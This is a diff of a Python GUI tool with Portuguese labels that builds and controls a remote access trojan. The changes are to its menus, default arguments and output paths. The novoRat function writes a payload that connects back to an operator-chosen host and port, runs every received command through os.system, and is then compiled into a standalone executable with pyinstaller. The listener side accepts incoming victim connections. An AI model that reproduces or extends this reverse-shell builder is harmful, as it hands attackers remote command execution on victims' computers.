@@ -50,17 +50,16 @@ def conectar(host, porta):
     server.listen(2)
     client, client_addr = server.accept()
     sg.popup("Uma nova conexão foi estabelecida!")
-    i = True
     conectado(client, client_addr)
     
                     
-def conectado(client, client_addr):
+def conectado(client=None, client_addr=None):
     sg.theme('DarkBlack')
     sg.theme_button_color(('white', '#9700FF'))
 
     menu = [
-        ['&RAT', ['&Novo']],
-        ['&Ajuda', ['&GitHub'], ['&Discord']]
+        ['&RAT', ['&Conectar', '&Novo']],
+        ['&Ajuda', ['&GitHub', '&Discord']]
     ]
 
     layout = [
@@ -92,8 +91,11 @@ def conectado(client, client_addr):
         if eventos == 'Novo':
             rat(client, client_addr,janela)
 
+        if eventos == 'Conectar':
+            init()
 
-def rat(client, client_addr,janela):
+
+def rat(client=None, client_addr=None,janela=None):
     sg.theme('DarkBlack')
     sg.theme_button_color(('white', '#9700FF'))
     
@@ -125,12 +127,13 @@ def rat(client, client_addr,janela):
             
 
 def novoRat(host, porta, nome):
-    with open('build/rat/'+nome + '.py', "w") as arquivo:
+    with open(nome + '.py', "w") as arquivo:
         arquivo.write('import socket\nimport subprocess\nimport os\nHOST=socket.gethostbyname("'+ host +'")\nPORT='+ porta +'\nclient = socket.socket()\nclient.connect((HOST, PORT))\nwhile True:\n    command = client.recv(1024)\n    command = command.decode()\n    os.system(command)')
         
-        conv = os.system("pyinstaller --onefile build/rat/"+ nome +".py")
+        conv = "pyinstaller --onefile ./"+ nome +".py"
+        os.system(conv)
 
-        sg.popup("Criado em: dist/"+ nome +"")
+        sg.popup("Criado: "+ nome +".exe")
 
 
 def cmd(client, client_addr, janela):
@@ -168,13 +171,4 @@ def cmd(client, client_addr, janela):
     
     
     
-
-            
-
-
-    
-
-
-
-
-init()
+conectado()
